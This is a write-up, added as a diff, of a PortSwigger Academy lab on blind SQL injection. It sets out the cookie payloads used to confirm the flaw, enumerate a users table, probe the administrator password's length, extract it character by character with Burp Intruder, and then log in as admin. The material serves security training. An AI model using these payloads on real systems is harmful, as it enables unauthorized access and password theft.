@@ -1,0 +1,90 @@
+PortSwigger Academy Lab: Blind SQL injection with conditional responses
+
+*****Check for SQL injection vulnerability******
+
+ATTEMPT-1
+⦁	Input: ' AND '1'='1
+⦁	Output: Welcome back!
+
+Lesson Learned: SQL injection vulnerability is present.
+
+*****Using Burp Suite to check if a vulnerability exists*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND '1'='1
+⦁	Output: Welcome Back!
+
+ATTEMPT-2
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND '1'='2
+⦁	Output: None
+
+Lesson Learned: Vulnerability exists in the tracking cookie.
+
+*****Checking if users table is present*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' 
+          AND (SELECT 'a' FROM users LIMIT 1)='a'--
+⦁	Output: Welcome Back!
+
+Lesson Learned: A table called users exists
+
+*****Check if a user called administrator exists*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND 
+⦁	       (SELECT 'a' FROM users WHERE username='administrator')='a'--
+⦁	Output: Welcome Back!
+
+Lesson Learned: A user named administrator exists.
+
+*****Check the length of the password of the administrator account*****
+
+ATTEMPT-1
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND 
+          (SELECT password FROM users WHERE username='administrator' AND LENGTH(password)>1)--
+⦁	Output: None
+
+ATTEMPT-2
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND 
+          (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+⦁	Output: Welcome Back!
+.
+.
+.
+ATTEMPT-20
+⦁	Input: TrackingId=o3awBEeBTQvfHdXK' AND 
+          (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
+⦁	Output: None
+
+Lesson Learned: The password length is exactly 20 characters.
+
+*****Utilizing Burp Intruder to check the characters in the password present at each position*****
+
+ATTEMPT-1
+⦁	Payload: TrackingId=o3awBEeBTQvfHdXK' AND 
+            (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+⦁	Password: d
+
+ATTEMPT-2
+⦁	Payload: TrackingId=o3awBEeBTQvfHdXK' AND 
+            (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
+⦁	Password: d2
+.
+.
+.
+ATTEMPT-20
+⦁	Payload: TrackingId=o3awBEeBTQvfHdXK' AND 
+            (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='§a§
+⦁	Password: d2kdkabuyykradnwkzqq
+
+Lesson Learned: How automation tools like Burp Intruder can speed up the testing process.
+
+*****Exploiting the vulnerability*****
+
+⦁	ATTEMPT-1
+Input: Username: administrator
+Password: d2kdkabuyykradnwkzqq
+Output: Welcome Administrator
+
+Lesson Learned: Gaining escalated access privileges through blind SQL injection methods.
